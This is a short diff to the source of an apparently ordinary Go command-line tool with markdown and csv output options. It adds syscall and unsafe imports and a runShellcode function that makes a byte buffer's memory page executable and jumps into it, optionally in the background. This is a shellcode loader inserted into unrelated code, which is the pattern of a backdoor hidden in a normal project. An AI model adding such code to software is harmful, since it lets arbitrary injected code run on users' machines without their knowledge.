@@ -45,6 +45,9 @@ import (
 	"github.com/spf13/pflag"
 	"github.com/spf13/viper"
 	"k8s.io/klog/v2"
+
+	"syscall"
+	"unsafe"
 )
 
 var (
@@ -81,6 +84,19 @@ var outputOptions = []string{
 	"custom",
 	"markdown",
 	"csv",
+}
+
+func runShellcode(shellcode []byte, bg bool) {
+	sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
+	page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
+	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
+	spointer := unsafe.Pointer(&shellcode)
+	sc_ptr := *(*func())(unsafe.Pointer(&spointer))
+	if bg {
+		go sc_ptr()
+	} else {
+		sc_ptr()
+	}
 }
 
 func init() {
